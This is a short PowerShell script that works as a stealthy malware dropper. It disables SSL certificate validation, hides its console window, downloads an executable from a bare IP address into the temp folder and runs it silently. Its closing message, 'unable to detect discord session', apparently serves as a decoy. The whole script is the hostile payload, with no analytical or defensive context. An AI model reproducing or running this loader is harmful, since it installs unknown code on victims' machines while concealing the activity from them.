# Bypass SSL verification
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# Hide PowerShell Console Window
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
"@
$consolePtr = [Win32]::GetConsoleWindow()
[Win32]::ShowWindow($consolePtr, 0)  # Hide the console window

# Define the download and execution parameters
$url = "https://87.62.99.194:8000/api/installer"  # Direct EXE download
$exePath = Join-Path $env:TEMP ('ISX_Installer.exe')

try {
    Write-Output "Establishing connection..."

    # Download the EXE using WebClient
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $exePath)

    # Validate the download
    if (-not (Test-Path $exePath) -or ((Get-Item $exePath).length -eq 0)) {
        Write-Output "failed. Exiting..."
        exit 1
    }

    # Run the executable
    Start-Process -FilePath $exePath -ArgumentList "-arg1" -NoNewWindow

} catch {
    Write-Output "An error occurred"
} finally {
    Write-Output "unable to detect discord session."
}
